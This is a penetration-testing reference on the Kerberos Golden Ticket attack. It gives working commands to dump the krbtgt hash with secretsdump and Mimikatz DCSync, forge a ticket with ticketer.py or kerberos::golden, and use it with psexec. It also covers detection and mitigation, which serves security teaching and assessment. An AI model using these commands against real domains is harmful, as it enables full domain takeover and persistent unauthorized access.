# Golden Ticket Attack

## Concept
The `krbtgt` account's password hash signs *every* Kerberos TGT (Ticket Granting Ticket) in the domain. If you obtain that hash, you can forge a completely valid TGT for any user — including one that doesn't exist, with any group memberships you want, and any expiration date. This bypasses normal authentication entirely; the DC will accept the forged ticket as legitimate because it's correctly signed.

## Requirements
- The NTLM hash (or AES key) of the `krbtgt` account — typically obtained via DCSync rights or direct access to a Domain Controller's NTDS.dit.
- The domain SID.

## Obtaining the krbtgt Hash
```bash
secretsdump.py domain.local/admin:pass@<dc-ip> -just-dc-user krbtgt
# or via Mimikatz on a compromised DC
lsadump::dcsync /user:domain\krbtgt
```

## Forging the Ticket
```bash
# Impacket
ticketer.py -nthash <krbtgt-ntlm-hash> -domain-sid <domain-sid> -domain domain.local fakeuser

# Mimikatz
kerberos::golden /user:fakeuser /domain:domain.local /sid:<domain-sid> /krbtgt:<krbtgt-ntlm-hash> /ptt
```

## Using It
```bash
export KRB5CCNAME=fakeuser.ccache
psexec.py -k -no-pass domain.local/fakeuser@<target>
```

## Why It's So Dangerous
- Works even after the compromised user account's password is changed (it doesn't rely on that account's credentials at all).
- Only mitigated by rotating the `krbtgt` password itself — **twice**, since Kerberos keeps the previous password valid for a grace period, so a single reset alone doesn't invalidate existing golden tickets.
- Can forge membership in *any* group, including Enterprise Admins, regardless of the fake account's real privileges.

## Detection Awareness (for defensive reports)
- Anomalous TGT lifetimes (default Golden Tickets are often set to unusually long validity, e.g. 10 years, by default tool settings — a dead giveaway if not customized).
- TGT requests for user accounts that don't exist, or for accounts with logon activity inconsistent with their normal pattern.
- Recommend: rotate `krbtgt` password twice on any suspected Golden Ticket compromise, monitor Event ID 4768/4769 for anomalies, and limit which accounts have DCSync-equivalent rights (`Replicating Directory Changes` / `Replicating Directory Changes All`).

## Silver Ticket (Related, Quieter Alternative)
Forges a TGS (not a TGT) for a *specific service*, signed with that service account's hash instead of krbtgt's. Doesn't touch the DC at ticket-use time, making it stealthier but limited to the one service it was forged for.